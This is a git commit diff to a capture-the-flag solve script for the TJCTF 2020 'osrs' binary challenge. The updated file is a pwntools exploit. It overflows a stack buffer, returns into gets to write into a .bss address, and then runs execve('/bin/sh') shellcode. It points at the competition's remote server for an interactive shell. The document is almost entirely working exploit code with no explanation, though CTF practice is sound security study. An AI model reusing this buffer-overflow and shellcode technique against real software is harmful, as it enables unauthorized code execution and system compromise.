7aaccb7c83c4f81163109acd50a96f2ab32e163c
snwo <seonu64@gmail.com>
2020-05-24 10:00:19 +0900

    osrssolve
    yes

--- 2020/TJCTF2020/BINARY/osrs_solve.py
+++ 2020/TJCTF2020/BINARY/osrs_solve.py
@@ -1,14 +1,17 @@
 from pwn import *
-#r=remote("p1.tjctf.org",8006)
-r=process("./osrs")
-
-pay="Normal"+'\x00'*10
-pay+='x'*0x90
-pay+=p32(0x1)
-pay+='x'*0x90
-
-
+r=remote("p1.tjctf.org",8006)
+#r=process("./osrs")
+b=ELF("./osrs")
+bss=0x8049f70
+shellcode='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+pay=""
+pay+='x'*0x10c
+pay+='x'*4
+pay+=p32(b.symbols['gets'])
+pay+=p32(bss)
+pay+=p32(bss)
 
 r.sendline(pay)
+r.sendline(shellcode)
 
 r.interactive()
